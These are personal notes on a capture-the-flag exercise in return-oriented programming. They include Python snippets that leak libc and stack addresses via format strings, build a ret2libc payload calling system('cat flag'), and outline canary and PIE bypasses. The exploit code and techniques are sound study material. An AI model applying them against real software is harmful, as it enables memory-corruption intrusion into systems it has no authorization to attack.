
Return Oriented programming

32bits

## Start

```shell
checksec
```

![[Pasted image 20231127212408.png]]

## Test local

### Find leak of the libc

File : bfprintf.py => print all the addr

```python
for i in range(450):  
    payload = f'%{i}$p'.encode()  
    target.sendline(payload)  
    res = target.recvline()  
    print(f"{i}: {res}")
```

Find an addresse that correspond to the libc 

![[Pasted image 20231115212800.png]]

In gdb : ```info proc map```

![[Pasted image 20231115212903.png]]

=> offset 2 point to the libc 

Then we will search the correspond element of the offset 2
in gdb ```x/10i addr```

![[Pasted image 20231115213232.png]]

We now know that it correspond to the _IO_2_1_stdin

we will now look of the offset in IDA of the _IO_2_1_stdin, system and exit

locally in my libc : 
```python
off_system = 0x0047CB0  
off_exit = 0x00DCCB0  
addr_stdio = 0x00226620
```

To calculate the base addr of the libc and the function system and exit within : 
```python
libc_base_addr = leak_addr - addr_stdio
memory_system_addr = libc_base_addr + off_system  
memory_exit_addr = libc_base_addr + off_exit
```

leak addr => offset 2 
```python
payload = b'%2$p|'  
target.sendline(payload)  
res = target.recvline()  
print(res)  
res = res.decode().strip("\n").split("|")  
print(res)  
leak_addr = res[0]  
leak_addr = int(leak_addr,16)  
```

### Get an addr in the stack
=> get the offset between the addr we find and the start of the buffer

File : bfprintf.py => print all the addr

```python
for i in range(450):  
    payload = f'%{i}$p'.encode()  
    target.sendline(payload)  
    res = target.recvline()  
    print(f"{i}: {res}")
```

=> look of the addr and find one that correspond of the stack 
In gdb : ```info proc map```

![[Pasted image 20231115214902.png]]

we will launch the script remotely and locaaly to see the diff in the offset - they have to be the same in the two
here at the offset 263 we found 0x80493a3 that corresponf to the return addr of handle, we see just above 0xffffd098 addr that point to the stack
addr leak => 0xffffd098

Then to get the offset we will search the addr of the start of the buffer in gdb 

breakpoint in fgets where the first arg is the buffer (fgets)
![[Pasted image 20231115214556.png]]



![[Pasted image 20231115214657.png]]

```python
buf_addr = (leak_stack - 0x448)
```

```python
payload = b'%2$p|%262$p'  
target.sendline(payload)  
res = target.recvline()  
print(res)  
res = res.decode().strip("\n").split("|")  
print(res)  
leak_addr = res[0]  
leak_addr = int(leak_addr,16)  
leak_stack = int(res[1],16)
```

### Calculate the lengh of the buffer

in ida count the push, ..
![[Pasted image 20231115220334.png]]

1028+4+4 = 1036 = 0x40C


we have now all the offset

```python
buf = b'n'  
buf += b'A' * (0x40C - len(buf))  
  
  
# get addr of buffer in gdb here 0xffffcc50 and addr leak in 262 0xffffd098  
buf_addr = (leak_stack - 0x448) # ebp - 0x408  
sys_argument_addr = buf_addr + 0x40C + 3 * 4    
  
buf += p32(memory_system_addr) # system  
buf += p32(memory_exit_addr) # exit  
buf += p32(sys_argument_addr) # system argument addr   
buf += b"          cat flag\0" # cat flag str
```


### We now have to change the offset in the libc of the remote server and we get the flag

![[Pasted image 20231115220601.png]]

# 64 bits

### Libc like 32


### Get the canary

to the return addr of handle in 

![[Pasted image 20231116201900.png]]

here 149 
usually the canary finish by \0 then it is at 147

### In GDB

Breakpoint to the return @
![[Pasted image 20240315224451.png]]


```x/50wx $esp```

![[Pasted image 20240314091922.png]]
canary = 0x72acd500
return@ = 0x8048aa2

#### Canary protection

At start of the program
Uniq value that not change

#### Bypass canary

- Read value of the canary (vulnerability that allows us to read it)
- Bad entropy
- Brute Force byte by byte : with fork by example if process crash then not good byte but if not good byte of the canary => can pass to the others byte 

## Get the gadget

rp-lin-gcc/rp-lin -f rop/rop200/exo -r3 --colors | grep pop
![[Pasted image 20231116202059.png]]

we will take 4c3
![[Pasted image 20231116213647.png]]


## Bypass PIE

=> get addr of pie 
```info proc map``` to know the exo addr load by the binary
![[Pasted image 20231116212822.png]]


looks with the format string an add in the stack 
![[Pasted image 20231116212716.png]]

verify with gdb the addr 
![[Pasted image 20231116212847.png]]

get the offset with ida of the addr in the exo
![[Pasted image 20231116212915.png]]

Finally make the calcul : 
```pie_base_addr = leak_pie - addr_start```



